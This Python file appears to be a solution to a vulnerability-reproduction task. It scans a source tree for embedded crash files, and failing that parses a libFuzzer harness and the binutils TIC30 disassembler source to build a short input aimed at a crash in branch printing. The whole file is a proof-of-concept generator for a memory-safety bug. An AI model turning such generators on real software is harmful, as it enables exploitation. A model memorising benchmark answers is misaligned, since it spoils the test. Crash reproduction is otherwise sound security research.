import os
import re
import tarfile
import zipfile
from typing import Iterator, Optional, Tuple, List


def _is_probably_binary(data: bytes) -> bool:
    if not data:
        return False
    if b"\x00" in data:
        return True
    printable = 0
    for b in data:
        if b in (9, 10, 13) or 32 <= b < 127:
            printable += 1
    return (printable / max(1, len(data))) < 0.85


def _decode_text(data: bytes) -> str:
    return data.decode("utf-8", errors="ignore")


class _SourceReader:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self.is_dir = os.path.isdir(src_path)
        self.is_tar = (not self.is_dir) and tarfile.is_tarfile(src_path)
        self.is_zip = (not self.is_dir) and (not self.is_tar) and zipfile.is_zipfile(src_path)

    def iter_files(self) -> Iterator[Tuple[str, int, bytes]]:
        if self.is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if not os.path.isfile(p):
                        continue
                    try:
                        with open(p, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    rel = os.path.relpath(p, self.src_path)
                    yield rel.replace("\\", "/"), st.st_size, data
            return

        if self.is_tar:
            try:
                with tarfile.open(self.src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        yield m.name, m.size, data
            except Exception:
                return
            return

        if self.is_zip:
            try:
                with zipfile.ZipFile(self.src_path, "r") as zf:
                    for zi in zf.infolist():
                        if zi.is_dir():
                            continue
                        try:
                            data = zf.read(zi.filename)
                        except Exception:
                            continue
                        yield zi.filename, zi.file_size, data
            except Exception:
                return
            return


def _pick_embedded_poc(reader: _SourceReader) -> Optional[bytes]:
    keywords = ("poc", "crash", "crasher", "repro", "overflow", "asan", "ubsan", "id:")
    bad_ext = (".c", ".h", ".cc", ".cpp", ".hpp", ".txt", ".md", ".rst", ".py", ".sh", ".cmake", ".in")
    best = None  # (priority, size, data)
    for name, size, data in reader.iter_files():
        if size <= 0 or size > 1024:
            continue
        lname = name.lower()
        if lname.endswith(bad_ext):
            continue
        prio = 0
        if any(k in lname for k in keywords):
            prio += 5
        if "/poc" in lname or "/crash" in lname or "testcase" in lname:
            prio += 3
        if _is_probably_binary(data):
            prio += 2
        if prio == 0:
            continue
        cand = (prio, size, data)
        if best is None:
            best = cand
            continue
        if cand[0] > best[0]:
            best = cand
        elif cand[0] == best[0]:
            if size < best[1]:
                best = cand
            elif size == best[1] and data.count(b"\x00") > best[2].count(b"\x00"):
                best = cand

    if best is None:
        return None

    prio, size, data = best
    if size == 10:
        return data
    # Prefer any 10-byte binary if present
    for name, size2, data2 in reader.iter_files():
        if size2 == 10 and _is_probably_binary(data2):
            lname = name.lower()
            if not lname.endswith(bad_ext):
                return data2
    return data


def _find_best_harness_source(reader: _SourceReader) -> Optional[str]:
    best_score = -1
    best_text = None
    for name, size, data in reader.iter_files():
        lname = name.lower()
        if not (lname.endswith(".c") or lname.endswith(".cc") or lname.endswith(".cpp") or lname.endswith(".h")):
            continue
        if size <= 0 or size > 800_000:
            continue
        text = _decode_text(data)
        score = 0
        if "LLVMFuzzerTestOneInput" in text:
            score += 10
        if "disassemble_info" in text:
            score += 4
        if "disassembler" in text:
            score += 4
        if "bfd_arch_tic30" in text or "tic30" in text:
            score += 6
        if "BFD_ENDIAN_BIG" in text or "BFD_ENDIAN_LITTLE" in text:
            score += 1
        if "info.buffer" in text and ("Data +" in text or "data +" in text):
            score += 2
        if score > best_score:
            best_score = score
            best_text = text
    return best_text if best_score >= 8 else None


def _parse_code_offset(harness_text: str) -> Optional[int]:
    offsets = []
    for m in re.finditer(r"\binfo\s*\.\s*buffer\s*=\s*(?:Data|data)\s*\+\s*(\d+)\s*;", harness_text):
        offsets.append(int(m.group(1)))
    for m in re.finditer(r"\binfo\s*\.\s*buffer\s*=\s*(?:Data|data)\s*\+\s*(\d+)\b", harness_text):
        offsets.append(int(m.group(1)))
    offsets = [o for o in offsets if 0 <= o <= 64]
    if not offsets:
        return None
    return min(offsets)


def _parse_min_size(harness_text: str) -> Optional[int]:
    mins = []
    for m in re.finditer(r"\bif\s*\(\s*Size\s*<\s*(\d+)\s*\)\s*return\s*0\s*;", harness_text):
        mins.append(int(m.group(1)))
    for m in re.finditer(r"\bif\s*\(\s*size\s*<\s*(\d+)\s*\)\s*return\s*0\s*;", harness_text):
        mins.append(int(m.group(1)))
    if not mins:
        return None
    return max(mins)


def _parse_endian_selector(harness_text: str) -> Tuple[int, int]:
    """
    Returns (data_index_for_endian, value_to_set_for_little_endian).
    Default assumes Data[1] & 1 ? BIG : LITTLE.
    """
    m = re.search(
        r"\(\s*(?:Data|data)\s*\[\s*(\d+)\s*\]\s*&\s*1\s*\)\s*\?\s*BFD_ENDIAN_(BIG|LITTLE)\s*:\s*BFD_ENDIAN_(BIG|LITTLE)",
        harness_text,
    )
    if not m:
        return 1, 0
    idx = int(m.group(1))
    first = m.group(2)
    second = m.group(3)
    # If bit set yields BIG, then little is 0, else little is 1
    if first == "BIG" and second == "LITTLE":
        return idx, 0
    if first == "LITTLE" and second == "BIG":
        return idx, 1
    return idx, 0


def _extract_array_initializer_regions(text: str) -> List[Tuple[int, int]]:
    regions = []
    for m in re.finditer(r"=\s*\{", text):
        start = m.end() - 1  # at '{'
        i = start
        depth = 0
        while i < len(text):
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    end = i + 1
                    # Require terminator nearby
                    tail = text[end:end + 5]
                    if ";" in tail or re.search(r"\s*;", tail):
                        regions.append((start, end))
                    break
            i += 1
    return regions


def _parse_tic30_arch_index(harness_text: str) -> Optional[int]:
    regions = _extract_array_initializer_regions(harness_text)
    best_idx = None
    best_region_len = None
    for (s, e) in regions:
        region = harness_text[s:e]
        if "tic30" not in region and "bfd_arch_tic30" not in region:
            continue
        # Parse entries at depth 1 (entries are usually {...}, {...}, ...)
        idx = -1
        depth = 0
        entry_start = None
        for i, ch in enumerate(region):
            if ch == "{":
                depth += 1
                if depth == 2:
                    idx += 1
                    entry_start = i
            elif ch == "}":
                if depth == 2 and entry_start is not None:
                    entry = region[entry_start:i + 1]
                    if "bfd_arch_tic30" in entry or re.search(r"\btic30\b", entry):
                        best_idx = idx
                        best_region_len = (e - s) if best_region_len is None else min(best_region_len, (e - s))
                        break
                depth -= 1
        if best_idx is not None:
            break
    return best_idx


def _find_tic30_dis_source(reader: _SourceReader) -> Optional[str]:
    best = None
    for name, size, data in reader.iter_files():
        lname = name.lower()
        if lname.endswith("tic30-dis.c") or lname.endswith("/tic30-dis.c") or lname.endswith("\\tic30-dis.c"):
            return _decode_text(data)
        if "tic30-dis.c" in lname and (lname.endswith(".c") or lname.endswith(".h")):
            best = _decode_text(data)
    return best


def _derive_branch_insn_from_dis(text: str) -> int:
    # Try to locate conditions that gate a call to print_branch and extract mask/value.
    # Heuristic: find occurrences of "print_branch" and look backwards for "(& 0x... ) == 0x..."
    candidates = []
    for m in re.finditer(r"\bprint_branch\s*\(", text):
        start = max(0, m.start() - 600)
        window = text[start:m.start()]
        # Find last mask-compare in window
        mm = None
        for mm2 in re.finditer(
            r"\(\s*(?:insn|ins|opcode|op|instr|instruction)\s*&\s*(0x[0-9a-fA-F]+)\s*\)\s*==\s*(0x[0-9a-fA-F]+)",
            window,
        ):
            mm = mm2
        if mm:
            mask = int(mm.group(1), 16)
            val = int(mm.group(2), 16)
            candidates.append((mask, val))
    if not candidates:
        # Broader scan: any if returning/using print_branch
        for mm in re.finditer(
            r"if\s*\(\s*\(\s*(?:insn|ins|opcode|op|instr|instruction)\s*&\s*(0x[0-9a-fA-F]+)\s*\)\s*==\s*(0x[0-9a-fA-F]+)\s*\)\s*\{[^{}]{0,200}\bprint_branch\s*\(",
            text,
            flags=re.DOTALL,
        ):
            mask = int(mm.group(1), 16)
            val = int(mm.group(2), 16)
            candidates.append((mask, val))
    if not candidates:
        return 0xFFFFFFFF

    # Choose candidate with most free bits (smallest popcount mask)
    best_mask, best_val = None, None
    best_free = -1
    for mask, val in candidates:
        free = 32 - (mask & 0xFFFFFFFF).bit_count()
        if free > best_free:
            best_free = free
            best_mask, best_val = mask, val
    insn = (best_val | ((~best_mask) & 0xFFFFFFFF)) & 0xFFFFFFFF
    return insn


class Solution:
    def solve(self, src_path: str) -> bytes:
        reader = _SourceReader(src_path)

        embedded = _pick_embedded_poc(reader)
        if embedded is not None:
            return embedded

        harness = _find_best_harness_source(reader)
        code_offset = 6
        min_size = 10
        endian_idx = 1
        little_bit_value = 0
        arch_idx = 0

        if harness:
            co = _parse_code_offset(harness)
            if co is not None:
                code_offset = co
            ms = _parse_min_size(harness)
            if ms is not None:
                min_size = ms
            endian_idx, little_bit_value = _parse_endian_selector(harness)
            ai = _parse_tic30_arch_index(harness)
            if ai is not None and 0 <= ai <= 255:
                arch_idx = ai

        tic30_dis = _find_tic30_dis_source(reader)
        insn = 0xFFFFFFFF
        if tic30_dis:
            insn = _derive_branch_insn_from_dis(tic30_dis)

        # Prefer little-endian for encoding; select prefix bit accordingly.
        want_little = True
        endian_value = little_bit_value if want_little else (little_bit_value ^ 1)
        insn_bytes = insn.to_bytes(4, byteorder="little" if want_little else "big", signed=False)

        prefix_len = max(code_offset, 2, endian_idx + 1)
        total_len = max(prefix_len + len(insn_bytes), min_size)

        poc = bytearray(b"\x00" * total_len)
        # Put arch selector in first byte (most common)
        poc[0] = arch_idx & 0xFF
        # Put endian selector
        if 0 <= endian_idx < len(poc):
            poc[endian_idx] = endian_value & 0xFF
        # Put instruction bytes at code_offset
        if code_offset + 4 <= len(poc):
            poc[code_offset:code_offset + 4] = insn_bytes
        else:
            # Ensure at least code_offset + 4
            poc.extend(b"\x00" * (code_offset + 4 - len(poc)))
            poc[0] = arch_idx & 0xFF
            if 0 <= endian_idx < len(poc):
                poc[endian_idx] = endian_value & 0xFF
            poc[code_offset:code_offset + 4] = insn_bytes

        return bytes(poc)